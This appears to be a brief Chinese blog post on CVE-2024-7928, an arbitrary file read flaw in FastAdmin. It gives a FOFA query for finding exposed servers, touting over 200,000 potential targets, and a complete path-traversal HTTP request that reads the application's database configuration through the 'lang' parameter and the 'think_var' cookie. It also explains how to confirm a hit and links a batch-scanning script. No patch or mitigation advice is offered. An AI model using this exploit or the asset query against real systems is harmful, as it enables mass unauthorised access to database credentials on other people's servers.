#  CVE-2024-7928 FastAdmin 任意文件读取 全网20w+潜在风险资产 含批量验证脚本   
合规渗透  合规渗透   2024-08-21 21:38  
  
```
fofa icon_hash="-1036943727"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj4FibYiaukpYiaS1YXGxsKbk1SasF1hb3aCicyKuzG7sv3HiaEIok3tIDp9k1S1eyDvDLzzMWJmrxIwlVA/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现：  
```
poc
GET /index/ajax/lang?lang=..//..//application/database HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: think_var=..%2F%2F..%2F%2Fapplication%2Fdatabase
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```  
  
请求该url，存在漏洞会包含字符  
jsonpReturn xxxxx  
 如下图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj4FibYiaukpYiaS1YXGxsKbk1S6oeVOT3qxic4Ise5pBY7tdm4Ww4K4rsvdaAoQsqqYwsfgSrEXAVZ3pg/640?wx_fmt=png&from=appmsg "")  
  
批量验证脚本：  
```
https://github.com/bigb0x/CVE-2024-7928/tree/main
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/vZZfNxKcwj4FibYiaukpYiaS1YXGxsKbk1SIPwOhhAfibvftLcWkShiaA488C6TLoQV1JCpial43ficcWWwCI94xppAfg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
